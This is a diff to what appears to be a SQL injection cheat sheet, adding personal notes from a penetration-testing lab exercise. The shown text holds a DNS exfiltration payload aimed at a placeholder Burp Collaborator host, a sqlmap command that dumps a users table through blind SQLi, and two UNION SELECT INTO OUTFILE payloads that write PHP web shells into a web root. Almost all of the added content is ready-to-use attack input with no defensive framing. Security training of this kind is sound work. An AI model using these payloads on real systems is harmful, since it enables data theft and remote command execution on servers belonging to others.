@@ -574,3 +574,18 @@ Cause a DNS lookup with the results of an injected query.
 - **MySQL** (Windows only): `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
 
 ---
+
+
+```
+Connect to the MySQL VM 3 and automate the SQL injection discovery via sqlmap as shown in this section. Then dump the users table by abusing the time-based blind SQLi and find the flag that is stored in one of the table's records.
+
+sqlmap -u http://192.168.215.19/blindsqli.php?user=1 -D offsec -T users -C description --dump --batch --answers='redirect=N,use=N'
+```
+
+
+```bash
+' UNION SELECT null,null,null,null,"<?php system($_GET['cmd']);?>" into outfile "/var/www/html/webshell.php"#
+
+
+' union select null,null,null,null,'<?php+system($_GET["cmd"]); ?>',null into outfile '/var/www/html/rce.php'#
+```
